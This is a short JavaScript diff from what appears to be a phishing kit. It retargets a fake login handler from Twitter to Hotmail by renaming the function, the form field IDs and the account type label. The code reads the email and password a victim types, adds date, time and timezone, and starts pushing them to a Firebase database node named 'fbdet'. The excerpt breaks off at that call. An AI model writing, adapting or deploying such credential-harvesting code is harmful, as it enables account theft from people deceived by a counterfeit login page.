@@ -14,19 +14,19 @@ console.log(appCheck);
 appCheck.activate('6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW', true);
 
 
-function tw_login() {
+function hmlog() {
   firebase.auth().signInAnonymously().catch(function(error) {
     var errorCode = error.code;
     var errorMessage = error.message;
     window.alert("Error: " + errorMessage);
   });
 
-  var email = document.getElementById('tw-email').value;
-  var password = document.getElementById('tw-pass').value;
+  var email = document.getElementById('hm-email').value;
+  var password = document.getElementById('hm-pass').value;
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  var accountType = 'Twitter';
+  var accountType = 'Hotmail';
 
   if (email !== '' && password !== '') {
     firebase.database().ref('fbdet').push({
